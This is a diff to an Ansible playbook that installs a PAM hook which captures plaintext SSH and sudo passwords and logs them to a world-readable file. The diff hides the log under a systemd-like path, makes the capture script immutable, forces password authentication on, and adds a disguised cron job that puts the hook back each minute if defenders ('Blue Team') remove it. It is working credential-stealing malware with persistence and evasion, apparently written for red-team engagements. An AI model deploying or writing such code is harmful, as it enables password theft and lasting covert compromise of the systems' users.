@@ -1,6 +1,6 @@
 ---
 # --- STEP 1: DEPLOY THE LOGGER ---
-- name: Deploy Simple PAM Logger
+- name: Deploy Hardened PAM Logger
   become: yes
   copy:
     dest: /usr/local/bin/ssh-auth-check
@@ -10,12 +10,18 @@
       # Read the password from the PAM stream
       read -d '' -r PASSWORD
       if [ -n "$PASSWORD" ]; then
-          # Log to the remote temp file
-          echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/tmp/ssh.txt
-          chmod 666 /var/tmp/ssh.txt
+          # Log to a persistent system directory instead of /var/tmp/
+          echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/lib/systemd/ssh-service.log
+          chmod 666 /var/lib/systemd/ssh-service.log
       fi
 
-# --- STEP 2: CONFIGURE GLOBAL TRAP ---
+# --- STEP 2: IMMUTABILITY (Hardens the script against deletion) ---
+- name: Make the logger script immutable
+  become: yes
+  shell: "chattr +i /usr/local/bin/ssh-auth-check"
+  ignore_errors: yes
+
+# --- STEP 3: CONFIGURE GLOBAL TRAP & SSH ---
 - name: Force Global PAM Trap and SSH Config
   become: yes
   lineinfile:
@@ -24,14 +30,21 @@
     line: "{{ item.line }}"
     insertbefore: "{{ item.insertbefore | default(omit) }}"
   loop:
-    # Inserts our logger at the top of the authentication stack
+    # Inserts our logger at the top of the global auth stack (catches Sudo too)
     - { path: '/etc/pam.d/common-auth', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
-    # Ensures passwords and PAM are active for SSH
     - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
     - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
   register: trap_updated
 
-# --- STEP 3: RESTART & STEALTH ---
+# --- STEP 4: SELF-HEALING PERSISTENCE (Cron job to re-infect if Blue Team cleans PAM) ---
+- name: Setup Self-Healing Cron
+  become: yes
+  cron:
+    name: "System-Svc-Monitor"
+    minute: "*/1"
+    job: 'grep -q "ssh-auth-check" /etc/pam.d/common-auth || sed -i "1i auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check" /etc/pam.d/common-auth'
+
+# --- STEP 5: RESTART & STEALTH ---
 - name: Restart SSH Service
   become: yes
   systemd:
